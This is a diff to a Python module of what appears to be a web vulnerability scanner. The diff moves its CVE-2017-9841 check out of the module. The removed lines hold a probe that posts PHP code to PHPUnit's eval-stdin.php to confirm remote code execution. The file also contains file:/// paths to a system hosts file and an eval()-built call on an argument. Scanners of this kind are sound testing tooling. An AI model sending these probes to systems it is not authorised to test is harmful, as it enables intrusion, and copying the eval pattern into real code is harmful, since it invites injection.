@@ -13,36 +13,20 @@ file:///C:/Windows/System32/drivers/etc/hosts
 file:///C:\Windows\System32\drivers\etc\hosts
 '''
 
-from lib.initial.config import config
-from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
+# from lib.initial.config import config
 from lib.tool.thread import thread
 from payloads.phpUint.cve_2017_9841 import cve_2017_9841_scan
 
 class phpUint():
     def __init__(self):
-        self.timeout = config.get('timeout')
-        self.headers = config.get('headers')
-        self.proxies = config.get('proxies')
-
         self.app_name = 'phpUint'
-        self.md = md5(self.app_name)
-        self.cmd = 'echo ' + self.md
         
-        self.randint_1, self.randint_2 = random_int_2() # * 获取2个随机整数, 用于回显漏洞判断
-
-        self.cve_2017_9841_payloads = [
-            {
-                'path': 'vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
-                'data': '<?=print({}*{})?>'.format(self.randint_1, self.randint_2)
-            },
-        ]
-
-    def addscan(self, url, vuln=None):
+    def addscan(self, clients, vuln=None):
         if vuln:
-            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))
+            return eval('thread(target=self.{}_scan, clients=clients)'.format(vuln))
 
         return [
-            thread(target=self.cve_2017_9841_scan, url=url)
+            thread(target=self.cve_2017_9841_scan, clients=clients)
         ]
 
 phpUint.cve_2017_9841_scan = cve_2017_9841_scan
